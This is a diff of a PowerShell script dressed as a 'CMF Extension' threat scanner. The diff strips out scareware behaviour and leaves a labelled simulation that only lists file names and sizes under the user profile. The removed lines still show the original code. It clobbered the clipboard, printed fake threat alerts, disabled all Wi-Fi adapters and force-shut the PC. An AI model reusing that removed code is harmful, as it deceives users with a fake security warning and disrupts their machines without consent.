@@ -1,10 +1,7 @@
-# Turns off Wi-Fi and shuts down the computer
-# Usage: Run PowerShell as Administrator, then: .\WifiOff-Shutdown.ps1
-
-#Requires -RunAsAdministrator
-
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.Clipboard]::SetText("DENIED CMF-E HAS DISABLED THE COMMAND ON UR PC. IT SHOULD ONLY BE 1 TIME USE.")
+# CMF Extension - simulated "threat scan" for demonstration purposes.
+# It only reads file names/sizes under your user profile and prints them.
+# It does NOT touch the clipboard, the network adapters or the power state.
+# Usage: powershell -ExecutionPolicy Bypass -File .\CMFEXTENSION+0.2.6.ps1
 
 Write-Host @"
    ______  ____    ____  ________       ________  ____  ____  _________  ________  ____  _____   ______   _____   ___   ____  _____              ____     _______       _____   
@@ -21,11 +18,11 @@ start-sleep -Milliseconds 50
 
 $userProfilePath = [Environment]::GetFolderPath('UserProfile')
 
-i.f (Test-Path $userProfilePath) {
+if (Test-Path $userProfilePath) {
     $files = Get-ChildItem -Path $userProfilePath -Recurse -File | Sort-Object FullName
 
     foreach ($file in $files) {
-        $fileSizeKB = [math]::Round($fileLength / 1KB, 2)
+        $fileSizeKB = [math]::Round($file.Length / 1024, 2)
         $createdDate = $file.CreationTime.ToString('yyyy-MM-dd HH:mm:ss')
         Write-Host "---[[CMF-E-V0.5.2]]: $($file.Name) | SIZE: $fileSizeKB KB | ThreatLEVEL: 0 | DATE CREATED: $createdDate | $($file.FullName)" -ForegroundColor Magenta
     }
@@ -45,42 +42,6 @@ for ($i = 1; $i -le $loadingSeconds; $i++) {
 }
 Write-Progress -Activity "Scanning system files" -Completed
 
-start-sleep -Milliseconds 125
-Write-Host "---[[CMF-E-V0.5.2]]: WARNING!!! FOUND THREATS. DISABLING WIFI + REBOOTING SYSTEM AND REMOVING THREATS" -ForegroundColor Red
-start-sleep -Milliseconds 50
-
-try {
-    # Get all Wi-Fi adapters (works even if there are multiple)
-    $wifiAdapters = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match "Wireless|Wi-Fi|802.11" -and $_.Status -eq "Up" }
-
-    if ($wifiAdapters) {
-        foreach ($adapter in $wifiAdapters) {
-            Disable-NetAdapter -Name $adapter.Name -Confirm:$false
-            Write-Host "Disabled adapter: $($adapter.Name)" -ForegroundColor Magenta
-        }
-    } else {
-        # Fallback: try toggling via netsh
-        netsh interface set interface "Wi-Fi" admin=disable
-        Write-Host "Wi-Fi disabled via netsh." -ForegroundColor Magenta
-    }
-} catch {
-    Write-Host "Could not disable Wi-Fi automatically. Error: $_" -ForegroundColor Red
-}
-start-sleep -Milliseconds 125
-Write-Host "---[[CMF-E-V0.5.2]]: DISABLED WIFI, MOVING TO THREAT REMOVAL!!!" -ForegroundColor Red
-
-for ($i = 1; $i -le 50; $i++) {
-    Write-Host "---[[CMF-E-V0.5.2]]: REMOVING THREATS!!!" -ForegroundColor Red
-    [Console]::Beep(1000, 50)
-    Start-Sleep -Milliseconds 15
-}
-
-for ($i = 1; $i -le 50; $i++) {
-    Write-Host "---[[CMF-E-V0.5.2]]: FATAL ERROR!!! MOVING TO LAST RESORT!!!" -ForegroundColor Red
-    [Console]::Beep(1000, 50)
-    Start-Sleep -Milliseconds 25
-}
-
-Start-Sleep -Seconds 5
-
-Stop-Computer -Force
+Write-Host "---[[CMF-E-V0.5.2]]: Scan complete. Nothing was disabled or deleted." -ForegroundColor Green
+Write-Host "---[[CMF-E-V0.5.2]]: (Simulation only - no adapters were touched and the PC will not reboot.)" -ForegroundColor Green
+start-sleep -Seconds 2
